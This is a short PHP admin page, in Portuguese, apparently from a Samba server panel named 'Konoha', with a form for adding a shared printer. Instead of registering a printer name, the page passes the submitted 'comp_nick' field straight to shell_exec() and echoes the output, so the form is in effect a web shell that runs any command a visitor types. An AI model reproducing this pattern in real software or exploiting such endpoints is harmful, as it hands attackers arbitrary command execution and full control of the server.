<html>
	<head>
		<title>Konoha</title>
		<link rel="stylesheet" type="text/css" href="../css/comp.css">
		<link rel="shortcut icon" href="../img/icon.png">
	</head>
	
	<body>
		<header>
			<?php include("../componentes/navbar.php"); ?>
		</header>
		<nav id="nav1"></nav>
		<section>
			<h1>
				<b>Adicionar impressora compartilhada:</b>
			</h1>
			<form name="formCamp" method="POST">
				<p>
					<b>Compartilhamento geral de impressoras:</b>
					<?php
						$c=`cat /Konoha/samba/imp_all`;
						echo "<pre>$c</pre>";
					?>
				</p>
				<p>
					<b>Informe o nome da impressora:</b>
					<br>
					<input type="text" name="comp_nick" id="comp_nick" placeholder="Ex.: IMP_DIRECAO">
				</p>
				<p>
					<br>
					<br>
					<input type="button" onclick="AddImpFunction();" value="Adicionar">
				</p>
			</form>
		</section>

		<br>
		<br>
		<br>

		<?php
			if (isset($_POST['comp_nick']))
			{
				$x = "{$_POST['comp_nick']}";
				

				$comando = shell_exec($x);
				echo "<pre>$comando</pre>";
			}
		?>

		<br>
		<br>
		<br>
		
		<footer>
			<?php include("../componentes/footerbar.php"); ?>
		</footer>
	</body>

	<script type="text/javascript">
		function AddImpFunction()
		{
			if (document.getElementById('comp_nick').value == '')
			{
				alert("Informe o nome da impressora!");
			}
			else
			{ 
				document.formCamp.submit();
			}
		}
	</script>
</html>